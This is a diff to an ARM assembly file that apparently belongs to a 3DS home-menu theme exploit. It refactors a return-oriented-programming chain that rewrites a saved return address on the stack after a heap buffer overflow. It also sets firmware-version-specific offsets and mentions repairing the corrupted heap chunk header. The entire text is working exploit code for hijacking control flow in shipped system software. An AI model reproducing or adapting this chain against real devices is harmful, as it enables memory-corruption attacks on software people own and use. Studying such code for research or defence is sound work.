@@ -6,6 +6,25 @@
 
 #define THEMEDATA_NEWFILEPATHS_BASEADDR 0x0fff0200
 
+#ifndef LOADOTHER_THEMEDATA
+
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
+#define THEMEDATA_LRADDVAL 0xfffffff4
+#else
+#define THEMEDATA_LRADDVAL 0xfffffff8
+#endif
+
+#else
+
+@ In addition to what was described below, rerun the theme-loading code during RET2MENU with this.
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
+#define THEMEDATA_LRADDVAL 0xfffffeac
+#else
+#define THEMEDATA_LRADDVAL 0xffffffd4
+#endif
+
+#endif
+
 _start:
 
 ropstackstart:
@@ -14,55 +33,9 @@ ropstackstart:
 ROPMACRO_COPYWORD TARGETOVERWRITE_STACKADR, (ORIGINALOBJPTR_BASELOADADR+8)
 
 @ The below adds the saved LR value on stack used during RET2MENU, with a certain value. This basically subtracts the saved LR so that a function which was previously only executed with the themehax state, gets executed again with the real state this time. Without this, this particular function never gets executed with normal state, which broke various things.
-ROP_SETLR ROP_POPPC
 
-.word POP_R0PC
-.word ROPBUFLOC(rop_ret2menu_stack_lrval) @ r0
-
-.word POP_R1PC
-.word TARGETOVERWRITE_STACKADR+0x20 @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the saved LR value on the stack which gets used during RET2MENU, to rop_ret2menu_stack_lrval.
-
-.word POP_R0PC
-rop_ret2menu_stack_lrval:
-.word 0
-
-.word POP_R1PC
-#ifndef LOADOTHER_THEMEDATA
-
-#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
-.word 0xfffffff4
-#else
-.word 0xfffffff8
-#endif
-
-#else
-
-@ In addition to what was described above, rerun the theme-loading code during RET2MENU with this.
-#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
-.word 0xfffffeac
-#else
-.word 0xffffffd4
-#endif
-
-#endif
-
-.word ROP_ADDR0_TO_R1 @ r0 = rop_ret2menu_stack_lrval + <above r1 value>
-
-.word POP_R1PC
-.word ROPBUFLOC(rop_ret2menu_stack_newlrval)
-
-.word ROP_STR_R0TOR1 @ Write the above r0 value to rop_ret2menu_stack_newlrval.
-
-.word POP_R0PC
-.word TARGETOVERWRITE_STACKADR+0x20 @ r0
-
-.word POP_R1PC
-rop_ret2menu_stack_newlrval:
-.word 0 @ r1
-
-.word ROP_STR_R1TOR0 @ Write the new LR value to the stack.
+@ <saved LR value on the stack which gets used during RET2MENU> += THEMEDATA_LRADDVAL.
+ROPMACRO_LDDRR0_ADDR1_STRADDR TARGETOVERWRITE_STACKADR+0x20, TARGETOVERWRITE_STACKADR+0x20, THEMEDATA_LRADDVAL
 
 @ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ buf overflow.
 #ifdef FIXHEAPBUF
